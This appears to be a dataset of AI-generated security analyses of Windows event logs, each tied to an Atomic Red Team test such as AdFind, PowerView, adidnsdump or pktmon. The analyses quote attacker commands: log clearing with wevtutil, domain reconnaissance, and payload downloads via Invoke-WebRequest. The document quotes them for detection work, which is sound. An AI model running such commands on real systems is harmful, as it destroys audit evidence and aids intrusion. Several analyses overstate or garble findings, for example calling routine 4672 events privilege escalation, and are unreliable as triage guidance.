   - This user account is responsible for clearing logs, which is highly suspicious activity when performed on critical event logs.

4. **Time Skew and Unexpected Behaviors:**
   - There is a time discrepancy event where the system time is altered. This is evidenced by the `Kernel-General` and `Security-Auditing` events indicating changes in system time. While a time adjustment itself isn't inherently malicious, it raises concerns when observed alongside other suspicious activities.

**Conclusion and Recommendation:**

Based on the clear sequence of events where multiple event logs are actively cleared and considering the privilege level under which these operations are executed, this pattern of behavior is highly indicative of malicious activity aimed to cover tracks after potentially unauthorized or malicious actions:

- **Resolution:** MALICIOUS.

**Guidance Going Forward:**

1. **Immediate Actions:**
   - Initiate an in-depth forensic analysis to determine the extent of compromise on `SERVER002`. Focus this investigation on activities preceding the event log clearing.
   - Isolate `SERVER002` from the network to prevent further potential malicious activities.

2. **Containment and Prevention:**
   - Ensure the user account `admin_test` is reviewed and if necessary, disabled or re-evaluated in terms of access levels and activities.
   - Implement stricter monitoring for log clearing activities across other systems.
   - Review and enhance the network’s auditing and monitoring capabilities, particularly focusing on the use of forensic tools to track logins and account activities.

3. **Review and Policy Enhancement:**
   - Evaluate current security policies regarding administrative access and log management.
   - Deploy endpoint detection and response (EDR) solutions to better monitor for these types of actions in the future. 

These steps should help mitigate any ongoing risk and reduce the likelihood of similar incidents recurring."
List Process Main Windows - C# .NET,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Clearing of Event Logs**:
   - The security log contains an event with Event ID 1102, indicating the security log was cleared. This is often a tactic used by attackers to cover their tracks after gaining unauthorized access or performing malicious actions. The user ""admin_test"" is associated with this activity, which suggests possible insider threats or compromised credentials.
   - The system log also shows multiple events (with Event ID 104) suggesting that both the Windows PowerShell and System event logs were cleared by the same user, ""admin_test."" This behavior is highly suspicious and indicative of potential malicious activity designed to hide evidence.

2. **Use of PowerShell and Command-Line Utilities**:
   - Sysmon logs show instances of PowerShell execution, particularly with the user ""admin_test"" executing ""wevtutil.exe"" to clear event logs. PowerShell, although a legitimate tool, is often used in attacks due to its ability to execute powerful commands and scripts.
   - There is also the use of a known TTP (Tactics, Techniques, and Procedures) where ""cmd.exe"" is used to compile and execute a binary (""T1010.exe"") from a source file within a temp directory named ""AtomicRedTeam."" This indicates the potential execution of a simulated attack or penetration testing scenario mimicking real-world attack behaviors, which could be part of a Red Team exercise.

3. **Execution of Unusual Binaries**:
   - The execution of ""T1010.exe"" compiled using “csc.exe” (C# compiler), especially from the Temp directory, is suspicious. This directory is commonly used for temporary storage but can also be used for executing unauthorized or malicious software.
   - The presence of ""AtomicRedTeam,"" a well-known collection of adversary simulation tests, hints at deliberate testing. However, without assurance of internal Red Team exercises, this activity raises security red flags.

4. **Credential Access Attempt**:
   - Numerous Event ID 5379 logs show failed attempts to access credentials related to a Microsoft Account and Windows Live tokens (return code 3221226021 indicates a failure). These repeated attempts to request credentials by undefined processes can be indicative of credential harvesting attempts.

Considering the above findings, the activity in these logs exhibits distinct characteristics of potential malicious activity. Specifically, the clearing of event logs, suspicious execution of binaries, and failed credential access attempts suggest an effort to compromise the system or test defenses.

**Resolution: MALICIOUS**

**Assessment and Recommendations**:
- It is quite likely that this activity is either a real malicious incident or a Red Team exercise imitating an attack.
- Immediate actions should include confirming if a Red Team exercise is authorized to rule out false positives.
- Perform a thorough investigation of user ""admin_test"" and an analysis of recent activities associated with these credentials.
- Implement stricter monitoring and alerting for the execution of PowerShell scripts and direct command-line log clearances.
- Remediate and monitor the affected systems and network to ensure no persistence mechanisms or further compromise exist.
- Ensure proper incident response protocols follow, including communication with relevant stakeholders and possibly involving forensic analysis."
Powershell enumerate domains and forests,"### Detailed Analysis:

Upon analyzing the provided event logs, several activities and patterns stand out as worthy of further scrutiny. Here is a breakdown of the most noteworthy findings:

#### 1. **Event Logs Clearing:**
   - **Security Log Clearing (Event ID 1102)**: An event log entry indicates that the Security Log on Server002 was cleared by the user `admin_test` (SID: `S-1-5-21-3962163828-2803415714-1403596700-1006`). Event log clearing is often indicative of an attempt to cover tracks, especially if not part of regular administrative tasks.
   - **Application and System Log Clearing (Event ID 104)**: The user `admin_test` also appears to clear the Application and the System logs. This aligns with attempts to remove traces of actions that may have raised suspicion.

#### 2. **Use of PowerShell Scripts:**
   - The events from the **Windows PowerShell log** indicate the execution of PowerShell commands importing modules like `PowerView.ps1` from the directory `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam`. These scripts are often used in penetration testing frameworks (e.g., Atomic Red Team) and could be leveraged for malicious reconnaissance activities like domain trust enumeration.
   - The command is set to perform operations such as `Get-NetDomainTrust` and `Get-ADGroupMember`, potentially suggesting reconnaissance activities around domain trusts and group memberships, which are generally anomalous in nature if not part of an authorized security activity.

#### 3. **Privileged Access and Impersonation:**
   - **Privilege Escalation (Event ID 4672)**: Multiple instances of the `SYSTEM` account receiving special privileges (like `SeDebugPrivilege`) are logged. While SYSTEM-level activities are not uncommon, they could facilitate further malicious actions.
   - **Unexpected System Account Operations (Event ID 4624)**: Logon activities using the `Advapi` process typically suggest service or scheduled task logons. However, in the context of other observed anomalies, they warrant further investigation, particularly regarding the originating process context.

#### 4. **Usage of Eventing Command Line Utility (`wevtutil.exe`):**
   - **Sysmon Events for `wevtutil.exe`**: The command `wevtutil.exe` is observed to be executed multiple times for clearing logs (`cl`) across several channels, consistent with log clearing actions recorded.
   - **Log Context**: The process creation and command-line arguments related to `wevtutil.exe` correlate with the cleared logs events, reinforcing the possibility of log deletion being an attempt to hide specific actions.

### Assessment and Conclusion:

Based on these findings, there are strong indicators of potentially malicious activity:

- The clearing of multiple log channels in close succession is a significant red flag, suggesting an attempt to erase evidence of conducted operations.
- The execution of a PowerShell script associated with administrative discovery aligns with reconnaissance tactics seen in adversarial actions.
- Actions involving privilege escalation privileges and SYSTEM-level impersonation raise concern over unauthorized lateral movement or privilege abuse.

Given these factors, the resolution for this investigation is:

- **MALICIOUS**: The combination of log clearing activities, PowerShell script execution for domain reconnaissance, and elevated privileges strongly suggest an active compromise or at least an inappropriate use of administrative capabilities.

### Guidance on How to Proceed:
1. **Immediate Incident Response**: Engage your incident response team to isolate the system to prevent further actions and preserve forensic artifacts.
2. **Conduct Forensic Analysis**: Examine file system changes, network connections, and memory for further traces of lateral movement or exfiltration.
3. **Audit Admin Activities**: Review the actions of user `admin_test` to verify if they align with authorized administrative activities or deviation patterns.
4. **Threat Analysis**: Analyze activities against known threat signatures and TTPs to determine if part of a broader intrusion campaign.
5. **Remediation and Strengthening**: Consider log retention strategies and PowerShell script execution restrictions to prevent similar occurrences in the future."
Adfind - Enumerate Active Directory Subnet Objects,"### Detailed Analysis

#### Findings:
1. **Log Clearing Events**: 
   - The `Security` log (EventID: 1102) and the `System` log (EventID: 104) have been cleared by the user `admin_test`. The clearing of logs is a common sign of malicious activity, as attackers often clear logs to cover their tracks. 
   - The `Windows PowerShell` log was also cleared, which could indicate an attempt to hide specific PowerShell activities. 

2. **PowerShell Activity**: 
   - Sysmon EventID: 5 shows the execution of PowerShell by the user `admin_test`. This could be legitimate administrative action, but given the context of log clearing, it raises suspicion.

3. **Suspicious Command Execution**:
   - The execution of `wevtutil.exe`, particularly with the `cl` (clear) command line argument, used multiple times to clear different event logs, confirms the intentional clearing of logs.
   - The execution of `cmd.exe` using `AdFind.exe`, a known Active Directory enumeration tool often used by attackers to gather information about an environment.

4. **Unused Entries in Security Log**:
   - Multiple `EventID: 5379` entries indicate attempts to access credentials using an unexpected account or method, resulting in check failures (`ReturnCode: 3221226021`). This might suggest an attempt to access credentials in a way that isn't working as intended.

#### Indicators of Malicious Activity:
- **Log Clearing**: The clearing of multiple logs in quick succession suggests deliberate obfuscation tactics, typical in post-exploitation phases.
- **Execution of AdFind via a temp location**: Running AdFind from a temporary directory suggests potentially unauthorized reconnaissance activity within the environment.
- **Multiple failed credential accesses**: Attempting (and failing) to access or use credentials without success repetitively is suspicious and aligns with potentially unauthorized access attempts.

### Assessment of the Situation
The combination of events involving log clearing, suspicious tool usage, attempts at credential access, and the execution of system utilities in ways that suggest obfuscation or information gathering strongly suggests a compromised environment. These are classic signs of post-exploitation activities aimed at maintaining persistence, gathering further intelligence about the network, and covering tracks.

### Resolution
Given the combination of suspicious activities and clear indicators pointing toward intentional malicious behavior, the activity in these logs can be confidently assessed as:

- **MALICIOUS**

### Guidance on How to Proceed

   - Isolate the affected host to prevent further unauthorized access and lateral movement within the network.
   - Alert the incident response team to begin a detailed forensic investigation of the compromised system.

2. **Forensic Analysis**:
   - Check for additional command histories, scripts, or unauthorized tools on the system.
   - Analyze network logs for unusual outbound connections, potentially indicating data exfiltration.

3. **Mitigation and Recovery**:
   - Change passwords for any credentials that may have been cached or used on the system.
   - Review and audit all accounts associated with access to this system.
   - Rebuild or restore the system to a known good state from a backup.

4. **Security Enhancement**:
   - Implement stricter logging policies and monitor for any similar activities in the future.
   - Conduct a thorough review of security procedures to ensure gaps in log monitoring and host protection are resolved."
Wmic Group Discovery,"Based on the provided Windows event logs, the investigation centered around potential indicators of malicious activity on the CEO's machine. The logs presented mostly relate to Sysmon events, which track detailed system activity, such as process creations.

### Suspicious Behavior Identified:

1. **Frequent Usage of System Utilities:**
   - There are multiple instances of system utilities such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `cmd.exe` being executed.
   - `wevtutil.exe` is being frequently executed to clear event logs for multiple channels (System, Windows PowerShell, Security).
   - The presence of `whoami.exe` suggests attempts to query the current user context, which may be legitimate but can also be used by an attacker for reconnaissance.

2. **Event Log Clearing:**
   - The System, Security, and Windows PowerShell event logs are being cleared by the user `SERVER002\\admin_test`. This action, especially if not in a maintenance window or not documented as part of regular IT operations, is highly suspect as it can be an attempt to cover tracks.
   - Sysmon EventID 1102 relates to event log clearing, which should trigger red flags if unexpected.

3. **Use of WMI Command-line (WMIC):**
   - Execution of `wmic group get name` via `cmd.exe`, indicative of system reconnaissance activity. This is often used in lateral movement attempts to understand user groups and privileges.

4. **Integrity Levels and User Context:**
   - All process executions occur at a High Integrity Level by the user `SERVER002\\admin_test`, suggesting the account has elevated privileges. This is also the account clearing logs.

5. **Suspicious Process Parentage:**
   - The process chains often originate from `wsmprovhost.exe` running with the `-Embedding` parameter, which can indicate a Windows Remote Management (WinRM) session, possibly being exploited.

6. **Potential Time Manipulation:**
   - Entries involving `EventID 4616` and `EventID 1` from different logs suggest changes to system time, indicating attempts to tamper with time settings, which can help evade detection mechanisms aligned with specific timeframes.

### Threat Assessment:
The combination of event log clearing, frequent execution of reconnaissance commands, and attempts to manipulate logs and system time point towards potential malicious activity. The context of these events within a short timeframe and the tools used suggest actions consistent with an attempt to maintain persistence or escalate privileges covertly.

### Resolution: **MALICIOUS**

### Recommended Actions:
1. **Immediate Containment:**
   - Isolate the affected machine from the network to prevent further unauthorized access or lateral movement.

2. **Detailed Forensics:**
   - Capture a memory image and further analyze it for any in-memory threats or unauthorized processes.
   - Review user activity logs to check for any unauthorized access or configuration changes.

3. **Account Review:**
   - Verify the activity scope and permissions assigned to the user `admin_test`. Reset credentials as necessary.

4. **Security Review:**
   - Audit all similar admin-level accounts and processes for any signs of compromise or similar activity patterns.

5. **Address Vulnerabilities:**
   - Ensure that event logging is re-enabled and adequately monitored to detect unusual activities post-investigation.

6. **Reporting and Documentation:**
   - Document the incident with respect to internal policies and inform top management and legal authorities if obligatory.

7. **User Training:**
   - Reinforce user awareness of security policies, particularly concerning the use of elevated access and the implications of log tampering."
Remote System Discovery - ping sweep,"Upon reviewing the provided Windows event logs, there are several key observations worth noting. Below are the critical highlights and analysis:

### Key Observations:

1. **Clearing of Event Logs:**
   - The logs show multiple instances (EventID: 104, System log) where the System, Application, and Windows PowerShell event logs were cleared by a user named **admin_test**. This was achieved using the wevtutil.exe command, which is indicative of an attempt to cover tracks and is highly suspicious.

2. **Sysmon Observations:**
   - The `wevtutil.exe` utility was used repeatedly to clear logs (EventID: 1).
   - There were several ping commands executed in succession which appear to be scanning a network range (indicated by the iterative ping commands targeting 192.168.1.x networks). This kind of behavior could be associated with network reconnaissance.

3. **PowerShell Activity:**
   - There are multiple PowerShell executions (EventID: 600, Windows PowerShell log) using the restricted execution policy. Notably, there was a command that inspects `.inf` files for installation entries, which could be either a legitimate operation or an attempt to identify vulnerable drivers or configurations.

4. **Windows Security Logs:**
   - Multiple successful logon events (EventID: 4624) relate to the SYSTEM user and what appear to be automated processes. 
   - High-privilege activities (EventID: 4672) report the usage of privileges such as SeDebugPrivilege, indicative of processes that require elevated permissions typically used in administration or potentially malicious actions.
   
5. **Potentially Malicious Patterns:**
   - The pattern of log clearing, combined with network scanning and high-privilege PowerShell execution, suggests a possible intrusion where an attacker is attempting to move laterally and hide their tracks.

### Assessment:
Based on the behaviors observed within the logs, there are indicators of potentially malicious activity. The clearing of event logs is a strong sign of malicious intent, particularly when combined with network reconnaissance and privileged command execution. These actions, performed by a specific user (`admin_test`) using elevated processes, suggest an insider or compromised account working to obfuscate activities.

### Resolution: SUSPICIOUS

### Recommendations:
- **Immediate Investigation:** Conduct an investigation into the activities of the `admin_test` account, verifying the legitimacy of actions taken.
- **Account Audit:** Ensure that the `admin_test` account is reviewed and monitored for further suspicious activity.
- **Log Monitoring:** Implement enhanced logging and monitoring to capture and alert similar activities, ensuring logs can't be easily cleared.
- **Threat Hunt:** Conduct a full threat hunt on the network for other indicators of compromise and potential breaches.
- **Security Controls:** Review and strengthen security controls, including two-factor authentication, network segmentation, and least privilege enforcement to prevent privilege misuse.

The above observations point to activities that warrant further investigation to rule out or confirm malicious intent and ensure the security of the environment."
Windows Internal pktmon set filter,"Upon analyzing the given logs, I have identified several indicators of suspicious and potentially malicious activity. Here's a detailed analysis with a focus on key events:

1. **Frequent and Automated Log Clearing:**
   - The logs include several instances where event logs (System, Windows PowerShell, and Security logs) are cleared by the user `admin_test` (Event IDs: 104 for System and Windows PowerShell logs, 1102 for Security logs). This activity can be an attempt to cover tracks and indicates suspicious behavior.

2. **Use of Sysmon (Event ID: 1) and wevtutil Commands:**
   - The `wevtutil.exe` utility, typically used for managing event logs, is invoked multiple times within a short span with commands to clear logs, pointing to deliberate actions to erase evidence of activities:
     - `wevtutil cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil cl Application`
     - `wevtutil cl Security`
     - `wevtutil cl ""Windows PowerShell""`
   - Clearing logs without a legitimate reason is a common behavior in system compromise scenarios.

3. **Unusual Command Execution with High Integrity Level:**
   - Execution of `pktmon.exe` via `cmd.exe` with the command `pktmon.exe filter add -p 445`. Packet monitoring set to a port commonly associated with SMB (445) might suggest an attempt to capture or monitor network traffic, indicating a potential reconnaissance or lateral movement preparation.

4. **Time Manipulation:**
   - Events in the Security log (Event ID: 4616) showing alterations to system time are also observed. This could potentially be used to disrupt time-based security controls, create confusion in log analysis, or support other malicious activities such as backdating files.

5. **High Execution Privileges and User Context:**
   - All identified commands and processes are executed with high integrity levels under the `SERVER002\admin_test` account, which implies admin-level rights are being leveraged, usually required for sensitive actions such as log clearing.

**Assessment:**
Based on these observations, the combination of log clearances, high-integrity command executions, and potential log tampering or obstruction strongly indicate intentional obfuscation activities. Further investigation into the source and intent of these actions is necessary.

**Resolution:** **MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the host from the network to prevent further potential data exfiltration or lateral movement.
- Conduct a comprehensive forensic investigation on the system to uncover any additional malicious artifacts or indicators of compromise.
- Review Active Directory logs and privileges associated with `SERVER002\admin_test` to determine potential account misuse or compromise.
- Monitor network traffic for further actions that may be taken by the user/attacker.
- Remediate by applying patches, changing credentials, and reinforcing logging and alerting mechanisms to prevent recurrence."
Discover System Language with dism.exe,"In reviewing the provided Windows event logs, there are several indicators of potentially malicious behavior that should be investigated further:

1. **Log Clearing Activity**: The logs show instances where logs were cleared. Specifically:
   - Event ID 104 (System Log Cleared) and Event ID 1102 (Security Log Cleared) indicate that the logs were cleared by the user ""admin_test"". The clearing of logs is a common tactic used by attackers to cover their tracks. This action was executed using `wevtutil.exe`, which is standard for such operations but should be alarming if not expected.

2. **Time Manipulation**:
   - Event IDs 4616 and 1 from the Kernel General event category indicate that there was a manipulation in system time by a process (`C:\Windows\System32\svchost.exe`). Time changes can be used to mislead detection mechanisms or to circumvent time-based security controls and should be regarded with suspicion unless this was planned maintenance or a legitimate change.

3. **Privilege Escalation**:
   - Event ID 4672 shows that multiple high-level privileges were granted to the ""admin_test"" user (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege). This could indicate an attempt to escalate privileges or perform unauthorized actions on the system.

4. **Suspicious Process Execution**:
   - The Sysmon logs show the frequent use of `wevtutil.exe` in conjunction with `conhost.exe` which were used multiple times for logging commands indicating potential script automation or execution of multiple commands.
   - There is a noticeable number of executions tied to `cmd.exe` with DISM (Deployment Image Servicing and Management) commands running in a context that might suggest probing or modifying system configurations, notably under the `admin_test` user account.

5. **Network and System Monitoring**:
   - The logs indicate WMI Provider Host (WmiPrvSE.exe) executing under NETWORK SERVICE privileges, which can be normal, but given the context, it could suggest potential lateral movement or reconnaissance activities if not expected.

Based on the detailed events and the context they are occurring within, I would categorize this situation as:

**Resolution: MALICIOUS**

### Threats and Risks Identified:
- Potential privilege escalation and log clearing by the user ""admin_test"".
- Time manipulation potentially to subvert security controls.
- Execution of critical system tools potentially linked to unauthorized or suspicious activities.

### Guidance on How to Proceed:
1. **Containment**: Isolate the affected host (Server002) to prevent further potential lateral movement or data exfiltration.
2. **Identification**: Investigate how the `admin_test` account was compromised or if an insider is involved. Verify all user access and privileges.
3. **Eradication**: Remove all unauthorized accounts and access. Change credentials and check for backdoors or persistence mechanisms.
4. **Recovery**: Restore the system using clean backups and verify integrity before bringing it back online.
5. **Lessons Learned**: Conduct a thorough review to understand how this breach occurred and update security protocols, conduct user training, and improve monitoring to catch such issues more promptly in the future."
Adfind - Enumerate Active Directory Admins,"Based on the Windows event logs provided, let's break down the analysis for any suspicious or anomalous behavior that might indicate malicious activity:

### Summary of Events:
1. **System Process Executions**:
   - TiWorker.exe and TrustedInstaller.exe are part of legitimate Windows update and installation processes.
   - SecurityHealthService.exe is a legitimate Windows process related to system health.
   - wsmprovhost.exe is also a legitimate Windows process related to Windows Remote Management.

2. **Suspicious Activity**:
   - Multiple executions of `wevtutil.exe` indicating attempts to clear event logs across several channels (Sysmon, Application, System, Windows PowerShell, Security). This behavior is often used to hide traces of malicious activity.
   - Executions of `cmd.exe` with reference to `AdFind.exe`, a tool commonly used to query Active Directory, suggesting potential reconnaissance activity.
   - Usage of `powershell.exe` by a user labeled as `admin_test`, typically not suspicious by itself but in conjunction with other activities must be considered.

3. **Security Log Events**:
   - Event ID 1102 indicates that the security log was cleared. This action, especially without a clear business justification, is typically a red flag for covering up malicious actions.
   - Successful logon events for SYSTEM (Event ID 4624) and privileged rights granted (Event ID 4672).

### Assessment and Resolution
The presence of `wevtutil.exe` clearing logs combined with the execution of `AdFind.exe` from a temporary directory suggests that someone may be trying to erase their digital footprint after potentially conducting reconnaissance. The involvement of a less common administrative user (`admin_test`) adds to the suspicion, especially given their role in executing commands that cleared logs.

**Resolution: MALICIOUS**

### Recommended Actions:
1. **Immediate Containment**:
   - Isolate Server002 from the network to prevent further potential malicious actions.
   - Change passwords for the `admin_test` account and other related admin accounts immediately.

2. **Investigation**:
   - Conduct further forensic analysis on the machine to understand the scope and source of the breach.
   - Review other related systems for similar events indicating lateral movement.

3. **Audit & Fortify**:
   - Implement stricter logging and monitoring policies. Ensure logs are backed up and tamper-evident.
   - Educate the team on signs of compromise and reinforce the principle of least privilege.

4. **Incident Report**:
   - Document the incident and actions taken for future reference and compliance requirements.

By addressing these steps, the organization can mitigate the immediate threat and bolster security against future incidents."
Remote System Discovery - adidnsdump,"Upon reviewing the provided Windows event logs, several activities raise concerns indicating potential malicious behavior. Here is a detailed analysis of the findings:

1. **Process Execution and Command Line Arguments**:
   - **Wevtutil.exe** and **cmd.exe Command Execution**:
     - Multiple instances of `wevtutil.exe` are executed with commands to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, `cl Windows PowerShell`). This activity is typically associated with attempts to hide malicious activities by clearing logs.
     - A PowerShell script was executed to download and install a Python setup using `invoke-webrequest`, which was followed by a `cmd.exe` execution with suspicious parameters (`\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\venv_t1018\\Scripts\\adidnsdump\"" -u domain\\user -p password --print-zones 192.168.1.1`). This script indicates potential data exfiltration or penetration testing activities.

2. **Privilege Escalation**:
   - **Event ID 4672** - Special privileges are assigned to a SYSTEM account. Commands requiring elevated privileges were used, including attempts to backdoor the system.
   
3. **Log Clearing Activities**:
   - **Event ID 1102** and **104** show that logs for System, Security, and PowerShell were cleared using `wevtutil` or other means. This activity commonly indicates an effort to remove traces of potentially malicious activity.
   
4. **Suspicious PowerShell Activity**:
   - A PowerShell session (`PowerShell.exe`) executed commands related to downloading and executing a Python installer from an external source.
   - Download and execution of Python setup via PowerShell, along with the subsequent Python executions, suggest scripts might be run to deploy further payloads or conduct reconnaissance.

5. **Particular Attention to Tools**:
   - **adidnsdump** tool used appears to be extracting DNS information, which could be reconnaissance for lateral movement or gathering network intelligence.
   - Use of external payloads and adidnsdump scripts suggests offensive security testing or malicious intent.

6. **Unusual Timing and Execution Patterns**:
   - Rapid succession of related processes and their associated command-line invocations seem orchestrated, indicative of a scripted or automated task sequence potentially for malicious intent.

Given these findings, the logs exhibit signs of activities commonly associated with penetration testing or malicious actions, such as evidence tampering (log clearance) and reconnaissance (using adidnsdump). The presence of these tools and actions, especially within such a sensitive timeframe involving privileged accounts or processes, raises a red flag.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent further potential compromise or data exfiltration.
2. **Detailed Malware and Threat Analysis**: Conduct a thorough investigation to determine if malware is present, and identify any data or access compromised.
3. **Review User Activities**: Analyze `admin_test` account activities to verify if the usage aligns with legitimate purposes or if access has been compromised.
4. **Enhanced Monitoring**: Deploy advanced monitoring and suspicious activity alerts on similar, high-value endpoints.
5. **Incident Response**: Engage the incident response team to conduct a detailed investigation and mitigation strategies.
6. **System Hardening**: Limit administrative privileges, enforce principle of least privilege, and employ multi-factor authentication.

Ensure forensic copies of logs and memory images are taken for a comprehensive investigation and potential legal inquiries."
List Windows Firewall Rules,"Upon reviewing the provided event logs, several observations can be made about the activities occurring on the Windows host (Server002). Let’s break down the key points and assess the situation:

### Observations and Analysis:

1. **Command Execution with Elevated Privileges:**
   - Logs indicate multiple instances where the `wevtutil.exe` command was used with high integrity levels (indicating it was run with elevated privileges). The commands executed were primarily clearing specific event logs (e.g., Sysmon, Application, Security, Windows PowerShell) using the command line arguments `wevtutil.exe cl <LogName>`.
   - The individual executing these commands is identified as `SERVER002\admin_test`.

2. **Console Host (conhost.exe) Instances:**
   - The Console Window Host `conhost.exe` instances follow the `wevtutil.exe` executions, possibly indicating terminal-related activities corresponding with the command executions.

3. **Security Logs Cleared:**
   - Event ID 1102 in the Security log shows that the security log was cleared. This activity is typically suspicious and is often associated with attempts to cover tracks after executing potentially malicious commands.

4. **Network Command Line Tool Usage:**
   - An instance of `cmd.exe` was used to execute a command that inspects firewall rules (`netsh advfirewall firewall show rule name=all`). This could potentially be an attempt to identify or modify the firewall settings to facilitate unauthorized access or data exfiltration.

5. **Whoami and Hostname Executions:**
   - `whoami.exe` and `hostname.exe` are executed, potentially to gather information about the logged-on user and host respectively. While not inherently malicious, in context, they can be part of reconnaissance activities.

6. **System and Security Updates:**
   - Logs indicate legitimate system and security updates being applied, such as Windows Defender updates. This suggests some regular maintenance activity was occurring in parallel.

### Assessment and Conclusion:

The activities observed in the logs are indicative of potential malicious behavior. Clearing event logs (`wevtutil.exe cl`) without a legitimate reason is suspicious as it could indicate an attempt to cover tracks following unauthorized access or actions. Moreover, the combination of command-line executions with elevated privileges, clearing logs, querying security settings, and gathering host information, suggests an adversary may be performing reconnaissance and attempting to avoid detection.

### Resolution: MALICIOUS

### Recommendation for Next Steps:
1. **Immediate Isolation:** Isolate the affected machine from the network to prevent potential lateral movement or data exfiltration.
2. **Comprehensive Investigation:** Conduct a deeper forensic analysis on the machine. Focus on identifying all processes executed, newly created/modified files, network connections established, and other potentially malicious activities.
3. **Audit and Review:** Review account activities, especially those of `admin_test`, to identify unusual access patterns or anomalies.
4. **Security Measures:** Reinforce security policies and ensure logging mechanisms are adequately configured to capture such activities for early detection in the future.
5. **Incident Response Team:** Notify incident response to manage containment, eradication, and recovery processes, while ensuring that potential data breaches are controlled and mitigated."
Win32_PnPEntity Hardware Inventory,"### Analysis of Windows Event Logs

#### Overview:
The provided logs reveal a sequence of events on `Server002`, with notable actions including the use of `wevtutil.exe`, manipulation of PowerShell, and log clearance activities. Given these activities, an investigation aims to uncover any indicators of compromise, malicious intent, or other anomalies.

#### Suspicious or Anomalous Behavior:

1. **Repeated Use of `wevtutil.exe`:**
   - Events indicate multiple instances of `wevtutil.exe` running with the `cl` (clear logs) command on channels like Sysmon, Application, System, Security, and ""Windows PowerShell"". This action suggests an attempt to hide activities by clearing the event logs, which is a common tactic used by attackers to reduce the visibility of traces after executing malicious actions.
   
2. **PowerShell Activity:**
   - A PowerShell session is detected performing operations to collect system data using `Get-WMIObject Win32_PnPEntity` with output processing commands. While PowerShell is commonly used for administration, the context of combining it with log clearing and the specific sequence makes it questionable.
   
3. **Event Log Clearance:**
   - The `Security`, `System`, and `Windows PowerShell` logs were cleared by the user `SERVER002\admin_test`, as seen in Event ID 104 (System log) and Event ID 1102 (Security log). Log clearance is highly unusual in regular system operations and usually indicates an attempt to hide malicious or unauthorized activity.
   
4. **Parent Process Relationships:**
   - Processes like `wevtutil.exe` and PowerShell are initiated by `wsmprovhost.exe` under the user `SERVER002\admin_test`. While this could link to legitimate administrative tasks, the operations executed are usually abnormal within typical operational contexts.

5. **Time Manipulation:**
   - Events indicating a change in system time have been logged (Event ID 4616 in Security log), possibly as part of an obfuscation technique to misalign timestamps and confuse investigators.

#### Indicators of Malicious Activity or Compromise:
- The presence of log clearing commands, especially with the `wevtutil.exe cl` command for crucial log sources, strongly indicates potential malicious intent.
- The combination of PowerShell data collection and log clearance operations is frequently associated with post-compromise activities, where the threat actor gathers data and attempts to cover tracks.

#### Assessment:
Given the evidence of log file clearance, use of data collection via PowerShell, and possible attempts to manipulate system time, the analyzed logs indicate a high probability of a security incident involving potentially malicious intent. The frequency and nature of the cleared events correlate with known tactics used in unauthorized access or data exfiltration.

#### Resolution:
**MALICIOUS** - The pattern of behavior involving the clearance of critical logs, use of PowerShell, and system time manipulations are consistent with malicious activities. Immediate response actions are necessary.

#### Guidance on How to Proceed:
1. **Immediate Response:**
   - Isolate the host (`Server002`) from the network to prevent further potential damage or data exfiltration.
   - Conduct a full forensic investigation to determine the extent of the compromise and identify any data leakage.
   - Analyze any other system interactions to identify if lateral movement within the network has occurred.

2. **Remediation Steps:**
   - Review and strengthen log configurations to ensure event visibility is maintained and protected against unauthorized clearance.
   - Review user accounts, particularly `admin_test`, to verify legitimacy and review access history for potential misuse.
   - Implement stricter monitoring and alerting mechanisms for PowerShell and log manipulation activities.

3. **Preventive Measures:**
   - Educate the team on recognizing signs of tampering and reinforce policies on log retention and system monitoring.
   - Regularly audit and revise access permissions, ensuring least privilege principles are applied.

By acting decisively with the outlined steps, the organization can mitigate risks and prevent future incidents of similar nature."
operating system discovery,"Upon reviewing the provided Windows event logs, the following observations have been made:

### Suspicious or Anomalous Behavior

1. **Event Log Clearing:**
   - Multiple `EventLog Cleared` events (EventID 104 and EventID 1102) are recorded in the System and Security logs. The user ""admin_test"" executed the `wevtutil cl` command on critical logs:
     - System
     - Windows PowerShell
     - Microsoft-Windows-Sysmon/Operational
   - Clearing event logs is a notable indicator of malicious activity, often executed to cover tracks.

2. **Process Execution:**
   - The `whoami.exe` and `hostname.exe` utilities were executed, which are commands often used by attackers to gather information about the system and the current user context.
   - The `wevtutil.exe` command was used multiple times, consistent with the clearing of the logs:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl Security`
     - `wevtutil.exe cl System`

3. **Windows PowerShell Activity:**
   - A PowerShell session is logged, executing the `Get-CimInstance` command. While this command itself can be benign, it can also be used in reconnaissance.
   - PowerShell sessions are often leveraged for malicious activity due to their powerful capabilities and scripting environment.

### Indicators of Compromise

- The combination of administrative actions (clearing logs) and the execution of reconnaissance commands (`whoami`, `hostname`) suggest an attempt to perform unauthorized actions while covering tracks. The high integrity level indicates that the actions were performed with elevated privileges.

### Assessment

- **Resolution: MALICIOUS**
  - Given the simultaneous clearing of multiple logs and execution of reconnaissance commands, these actions align with typical behaviors observed in system compromise scenarios.
  - The activity suggests an intentional effort to execute malicious tasks while obscuring evidence from detection.

### Guidance on How to Proceed

1. **Containment and Eradication:**
   - Isolate the affected host (Server002) from the network to prevent further compromise.
   - Conduct a thorough investigation of the ""admin_test"" account for unauthorized access or credential compromise.
   - Consider resetting all passwords, especially for privileged accounts, and enable multi-factor authentication if not already in place.

2. **Investigation and Remediation:**
   - Analyze recent backups to identify any changes or unauthorized data access.
   - Review other systems for similar logging of suspicious activity, indicating a broader attack scope.
   - Restore the impacted systems from a known clean state before the incident occurred.

3. **Monitoring and Detection:**
   - Implement enhanced logging and monitoring. Ensure regular reviews of logs are conducted to detect anomalies.
   - Deploy security solutions to monitor for unauthorized use of PowerShell and other administrative tools.
   - Use Sysmon or an EDR solution to detect similar patterns in process execution and network activity.

These steps will help ensure that the system is clean and secure, and will also enhance security posture to prevent future incidents."
